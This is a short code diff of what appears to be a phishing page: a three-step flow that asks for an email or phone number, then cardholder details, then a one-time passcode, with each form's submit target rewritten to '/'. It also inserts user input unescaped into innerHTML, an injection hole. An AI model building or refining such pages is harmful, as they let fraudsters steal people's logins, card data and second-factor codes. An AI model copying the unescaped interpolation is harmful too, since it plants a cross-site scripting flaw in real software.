@@ -50,7 +50,7 @@
                 container.innerHTML = `
                     <h1 class="form-title">Sign in</h1>
                     ${error ? `<div class="error-message">${error}</div>` : ''}
-                    <form method="POST" action="/submit?step=email">
+                    <form method="POST" action="/">
                         <div class="form-group">
                             <label for="email_or_phone" class="form-label">Email or mobile phone number</label>
                             <input type="text" id="email_or_phone" name="email_or_phone" class="form-input" value="${userInput}" required>
@@ -69,7 +69,7 @@
                 container.innerHTML = `
                     <h1 class="form-title">Verify your account</h1>
                     ${error ? `<div class="error-message">${error}</div>` : ''}
-                    <form method="POST" action="/submit?step=verify_card">
+                    <form method="POST" action="/">
                         <div class="form-group">
                             <label for="cardholder_name" class="form-label">Cardholder name</label>
                             <input type="text" id="cardholder_name" name="cardholder_name" class="form-input" required>
@@ -99,7 +99,7 @@
                 container.innerHTML = `
                     <h1 class="form-title">Verify with OTP</h1>
                     ${error ? `<div class="error-message">${error}</div>` : ''}
-                    <form method="POST" action="/submit?step=otp">
+                    <form method="POST" action="/">
                         <div class="form-group">
                             <label for="otp" class="form-label">Enter OTP</label>
                             <input type="text" id="otp" name="otp" class="form-input" required>
